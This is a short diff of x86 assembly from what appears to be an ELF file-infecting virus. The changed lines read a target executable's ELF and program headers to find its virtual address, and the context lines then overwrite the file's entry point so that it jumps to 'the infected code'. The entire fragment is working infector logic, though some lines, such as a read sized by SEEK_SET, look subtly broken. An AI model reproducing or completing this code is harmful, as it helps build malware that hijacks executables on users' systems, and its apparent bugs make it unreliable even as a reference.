@@ -78,15 +78,13 @@ _start:
 	
 	;now we should find the virt address the elf file is being read to
 	;using go to ph_section->ph_viruaddress
-	mov ebx, ELF_HEADER+PHDR_start 		 ; load into ebx Address of first entry
-	add ebx, PHDR_size					 ; load into ebx Address of second entry
-	add ebx, PHDR_vaddr
-	lseek dword [esp], ebx, SEEK_SET
-	read dword [esp], [esp+8], 4		; read 4 bytes of the file's va into [esp+8]
-	mov edx, [esp+8]					; load the address into edx
-	add edx, [esp+4]					; add the file length into va
-	mov [esp+12], edx
-	;now edx is the value we want to put in the entry point
+	lseek esi, 0, SEEK_SET
+	read esi, [esp+20], ELFHDR_size	;read the ELF header into esp+20
+	lseek esi, [esp+20+ELFHDR_phoff], SEEK_SET		;set fd pointer to the first ph
+	read esi, [esp+12], SEEK_SET			;read the first ph offset into esp+12
+	lseek esi, [esp+12+PHDR_start+ph_viruaddress], SEEK_SET	;set fd to the first ph va
+	read esi, [esp+12], 4				;read the va into esp+12
+
 	mov eax, eax						; flag for debug - so it'll be easy to find the line
 	lseek dword [esp], ENTRY, SEEK_SET	; set fd pointer to entry point
 	write dword [esp], dword [esp+12], 4	;set entry point to the infected code
